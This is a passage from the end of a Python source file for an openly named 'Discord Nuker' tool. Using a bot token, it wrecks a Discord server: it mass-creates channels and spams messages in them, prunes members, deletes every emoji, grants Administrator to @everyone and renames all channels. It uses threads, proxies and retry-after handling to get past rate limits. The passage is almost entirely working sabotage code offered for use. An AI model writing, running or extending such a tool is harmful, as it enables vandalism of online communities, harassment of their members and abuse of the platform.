                with print_lock: Logger.Error.change("Guild Icon")
            rename_done[0] = True

        # Wait for del step to finish first, then fire create + rename together
        while del_finished < len(del_loads):
            time.sleep(0.05)

        Thread(target=rename_and_icon, daemon=True).start()
        for load in chan_slots:
            Thread(target=create_nuke_chan, args=(load,)).start()
        while create_finished < len(chan_slots):
            time.sleep(0.05)
        while not rename_done[0]:
            time.sleep(0.05)

        # ── Step 4: Spam messages in all created channels — immediately ──────────
        if not created_channel_ids:
            Logger.Error.error("No channels created to spam.")
            return await back_to_manu()

        palette_print(f"[*] Spamming {spam_amt} messages in {len(created_channel_ids)} channels...", "ocean")
        msg_loads    = WorkController.seperate(created_channel_ids, Threads)
        msg_finished = 0

        def spam_msg_worker(load):
            nonlocal msg_finished
            for cid in load:
                for _ in range(spam_amt):
                    try:
                        res = Tools.request("post", Tools.api(f"channels/{cid}/messages"),
                                            headers=headers, json={"content": spam_msg}, timeout=3)
                        if res.status_code in [200, 201]:
                            with print_lock: Logger.Success.success(f"Sent -> [{cid}] : {spam_msg}")
                        elif res.status_code == 429:
                            time.sleep(float(res.json().get("retry_after", 1)))
                    except Exception:
                        pass
                    time.sleep(global_timeot)
            msg_finished += 1

        for load in msg_loads:
            Thread(target=spam_msg_worker, args=(load,)).start()
        while msg_finished < len(msg_loads):
            time.sleep(0.05)

        Logger.Success.success("Guild nuke sequence complete.")
        return await back_to_manu()

    # ── 5 (p2) - Server Prune ────────────────────────────────────────────────────
    elif choice_val == "20":
        if not Tools.has_permission(guild_id, headers, "KICK_MEMBERS"):
            Logger.Error.error("Bot lacks permission: KICK_MEMBERS")
            return await back_to_manu()

        try:
            days_input = check_exit(input(Fore.WHITE + "Prune members inactive for how many days? [1-30]: ")).strip()
            try:
                days = max(1, min(30, int(days_input)))
            except Exception:
                days = 7

            # Dry-run first — get count
            dry_res = Tools.request("get", Tools.api(f"guilds/{guild_id}/prune"),
                                    headers=headers, params={"days": days, "compute_prune_count": "true"})
            if dry_res.status_code == 200:
                expected = dry_res.json().get("pruned", "?")
                palette_print(f"[~] {expected} members would be pruned. Proceeding...", "ocean")

            prune_res = Tools.request("post", Tools.api(f"guilds/{guild_id}/prune"),
                                      headers=headers,
                                      json={"days": days, "compute_prune_count": True})
            if prune_res.status_code in [200, 201]:
                pruned = prune_res.json().get("pruned", 0)
                Logger.Success.success(f"Pruned {pruned} inactive members (>{days} days).")
            else:
                Logger.Error.error(f"Prune failed: {Tools.get_detailed_error(prune_res)}")
        except Exception as e:
            Logger.Error.error(f"Error during prune: {e}")
        return await back_to_manu()

    # ── 6 (p2) - Delete All Emojis ───────────────────────────────────────────────
    elif choice_val == "21":
        if not Tools.has_permission(guild_id, headers, "MANAGE_EMOJIS_AND_STICKERS"):
            Logger.Error.error("Bot lacks permission: MANAGE_EMOJIS_AND_STICKERS")
            return await back_to_manu()

        emoji_headers = {
            "Authorization": f"Bot {token}",
            "Content-Type":  "application/json",
            "X-Audit-Log-Reason": "emoji nuke"
        }

        emojis_res = Tools.request("get", Tools.api(f"guilds/{guild_id}/emojis"),
                                   headers=emoji_headers)
        if emojis_res.status_code != 200:
            Logger.Error.error(f"Failed to fetch emojis: {Tools.get_detailed_error(emojis_res)}")
            return await back_to_manu()

        emojis = emojis_res.json()
        if not emojis:
            Logger.Error.error("No emojis found in this guild.")
            return await back_to_manu()

        palette_print(f"[~] Found {len(emojis)} emoji(s). Deleting...", "ocean")

        # Emojis created by apps need the app to delete them — split into two pools
        bot_created  = [e for e in emojis if e.get("managed")]
        user_created = [e for e in emojis if not e.get("managed")]

        all_emojis_to_delete = user_created + bot_created   # user-created first
        all_loads = WorkController.seperate(all_emojis_to_delete, min(Threads, 5))  # Discord rate-limits emojis hard
        finished_loads = 0

        def delete_emoji_worker(load):
            nonlocal finished_loads
            for emoji in load:
                eid, ename = str(emoji["id"]), emoji["name"]
                tries = 0
                while tries < 3:
                    tries += 1
                    try:
                        res = Tools.request(
                            "delete",
                            Tools.api(f"guilds/{guild_id}/emojis/{eid}"),
                            headers=emoji_headers,
                            timeout=8
                        )
                        if res.status_code in [200, 204]:
                            with print_lock: Logger.Success.delete(f":{ename}:", eid)
                            break
                        elif res.status_code == 429:
                            try:
                                retry_after = float(res.json().get("retry_after", 2))
                            except Exception:
                                retry_after = 2.0
                            time.sleep(retry_after)
                            continue        # retry same emoji
                        elif res.status_code == 403:
                            with print_lock: Logger.Error.delete(f":{ename}:", "Missing Permissions (403)")
                            break
                        elif res.status_code == 404:
                            with print_lock: Logger.Error.delete(f":{ename}:", "Not Found (already deleted?)")
                            break
                        else:
                            with print_lock: Logger.Error.delete(f":{ename}:", Tools.get_detailed_error(res))
                            break
                    except Exception as e:
                        if tries >= 3:
                            with print_lock: Logger.Error.delete(f":{ename}:", str(e))
                        time.sleep(1)
                time.sleep(0.05)    # emoji endpoint: 1/sec per guild hard limit
            finished_loads += 1

        for load in all_loads:
            Thread(target=delete_emoji_worker, args=(load,)).start()
        while finished_loads < len(all_loads):
            time.sleep(0.05)

        Logger.Success.success("Finished deleting all emojis.")
        return await back_to_manu()

    # ── 7 (p2) - Give Admin to @everyone ────────────────────────────────────────
    elif choice_val == "22":
        if not Tools.has_permission(guild_id, headers, "MANAGE_ROLES"):
            Logger.Error.error("Bot lacks permission: MANAGE_ROLES / ADMINISTRATOR")
            return await back_to_manu()

        try:
            res = Tools.request("patch", Tools.api(f"guilds/{guild_id}/roles/{guild_id}"),
                                headers=headers, json={"permissions": "8"})
            if res.status_code in [200, 201, 204]:
                Logger.Success.success("Granted Administrator to @everyone.")
            else:
                Logger.Error.error(f"Failed: {Tools.get_detailed_error(res)}")
        except Exception as e:
            Logger.Error.error(f"Error: {e}")
        return await back_to_manu()

    # ── 8 (p2) - Rename All Channels ────────────────────────────────────────────
    elif choice_val == "23":
        if not Tools.has_permission(guild_id, headers, "MANAGE_CHANNELS"):
            Logger.Error.error("Bot lacks permission: MANAGE_CHANNELS")
            return await back_to_manu()

        new_name = check_exit(input(Fore.WHITE + "New name for all channels: ")).strip()
        if not new_name:
            Logger.Error.error("Invalid channel name.")
            return await back_to_manu()

        req_ = Tools.request("get", Tools.api(f"guilds/{guild_id}/channels"), headers=headers)
        if req_.status_code != 200:
            Logger.Error.error("Failed to fetch channels.")
            return await back_to_manu()

        channels = req_.json()
        if not channels:
            Logger.Error.error("No channels found.")
            return await back_to_manu()

        all_loads = WorkController.seperate(channels, Threads)
        finished_loads = 0

        def rename_worker(load):
            nonlocal finished_loads
            for ch in load:
                cid, old = ch["id"], ch["name"]
                tries = 0
                while tries < 3:
                    tries += 1
                    try:
                        res = Tools.request("patch", Tools.api(f"channels/{cid}"),
                                            headers=headers, json={"name": new_name}, timeout=5)
                        if res.status_code in [200, 201, 204]:
                            with print_lock: Logger.Success.success(f"Renamed #{old} to #{new_name} [{cid}]")
                            break
                        elif res.status_code == 429:
                            time.sleep(float(res.json().get("retry_after", 1)))
                        else:
                            with print_lock: Logger.Error.error(f"Failed #{old}: {Tools.get_detailed_error(res)}")
                            break
                    except Exception as e:
                        if tries >= 3:
                            with print_lock: Logger.Error.error(f"Failed #{old}: {str(e)}")
                        time.sleep(1)
                time.sleep(global_timeot)
            finished_loads += 1

        for load in all_loads:
            Thread(target=rename_worker, args=(load,)).start()
        while finished_loads < len(all_loads):
            time.sleep(0.05)

        Logger.Success.success("Finished renaming all channels.")
        return await back_to_manu()


# ========================= BOT VERIFIER =========================================
class BotVerifier:
    @staticmethod
    def test_token(token):
        try:
            res = Tools.request("get", "https://discord.com/api/v10/users/@me",
                                headers={"Authorization": f"Bot {token}"}, timeout=5)
            return res.status_code == 200
        except Exception:
            return False

    @staticmethod
    def is_in_guild(token, guild_id):
        try:
            res = Tools.request("get", f"https://discord.com/api/v10/guilds/{guild_id}",
                                headers={"Authorization": f"Bot {token}"}, timeout=5)
            return res.status_code == 200
        except Exception:
            return False


# ========================= START ================================================
def start(args):
    global token, names, amount, invite_link, guild_name

    # Proxy check in background — silent, doesn't block startup
    Thread(target=init_proxies, daemon=True).start()

    if len(args) != 1:
        if args[1].endswith(".json") and os.path.exists(args[1]):
            with open(args[1], "r", encoding="utf8") as fp:
                j = json.loads(fp.read())
            _in = lambda t: j[t] if t in str(j) else None
            token       = _in("Token")
            names       = _in("SpamTexts")
            amount      = _in("SpamAmount")
            guild_name  = _in("ServerName")
            invite_link = _in("SpamInviteLink")

    System.Clear()
    System.Title("Discord Nuker - github.com/Bad-Discord/Discord-Nuker")
    System.Size(160, 40)

    Funcs.print_logo()
    term_width = shutil.get_terminal_size().columns

    def center_block(text: str) -> str:
        return "\n".join(
            " " * max(0, (term_width - len(line)) // 2) + line
            for line in text.split("\n")
        )

    print(center_block(" > if i play, i play to win. ; blood)s\n"))

    while True:
        token_input = input(Fore.WHITE + "> Bot Token : ").strip()
        check_exit(token_input)
        token = token_input
        if BotVerifier.test_token(token):
            break
        else:
            palette_print("Invalid token, try again.", "crimson")
            token = None

    System.Clear()
    Funcs.print_logo()
    print(center_block(" > if i play, i play to win. ; blood)s\n"))

    while True:
        guild_input = input(Fore.WHITE + "> Guild ID : ").strip()
        check_exit(guild_input)
        guild = guild_input
        if guild.isnumeric():
            if BotVerifier.is_in_guild(token, int(guild)):
                break
            else:
                palette_print("Bot is not in this guild or invalid guild ID.", "crimson")
        else:
            palette_print("Please enter a valid numeric guild ID.", "crimson")

    # ── Session init — proxy check + perm cache + status lines ──────────────────
    System.Clear()
    Funcs.print_logo()
    print(center_block(" > if i play, i play to win. ; blood)s\n"))

    init_lines = []

    def _add(line): init_lines.append(line); print(palette.ocean(line))

    _add("[~] Starting session checks...")

    # Proxy status
    from Plugins.tools import _proxy_pool, _proxies_loaded
    if not _proxies_loaded:
        _add("[~] Checking proxies...")
        init_proxies()
        from Plugins.tools import _proxy_pool as _pp
        proxy_count = len(_pp)
    else:
        proxy_count = len(_proxy_pool)

    if proxy_count == 0:
        _add("[!] Proxies : None loaded — running direct")
    else:
        _add(f"[+] Proxies : {proxy_count} live proxies loaded")

    # Permission cache
    _add("[~] Fetching bot permissions...")
    prime_permission_cache(guild, token)
    _add("[+] Permissions : cached")

    # Bot + guild info
    h_tmp = {"Authorization": f"Bot {token}", "Content-Type": "application/json"}
    try:
        bot_res   = Tools.request("get", Tools.api("users/@me"), headers=h_tmp, timeout=5)
        guild_res = Tools.request("get", Tools.api(f"guilds/{guild}"), headers=h_tmp, timeout=5)
        bot_name   = bot_res.json().get("username", "Unknown") if bot_res.status_code == 200 else "Unknown"
        guild_name_ = guild_res.json().get("name", "Unknown")  if guild_res.status_code == 200 else "Unknown"
        member_count = guild_res.json().get("approximate_member_count") if guild_res.status_code == 200 else "?"
        _add(f"[+] Logged in as : {bot_name}")
        _add(f"[+] Server       : {guild_name_}")
        _add(f"[+] Members      : {member_count if member_count else '?'}")
    except Exception:
        _add("[!] Could not fetch bot/guild info")

    _add("[+] Ready.")
    print()
    input(palette.ocean(">> Press ENTER to open menu <<"))

    System.Clear()
    asyncio.run(main(token, int(guild), page=1))


if __name__ == "__main__":
    start(sys.argv)
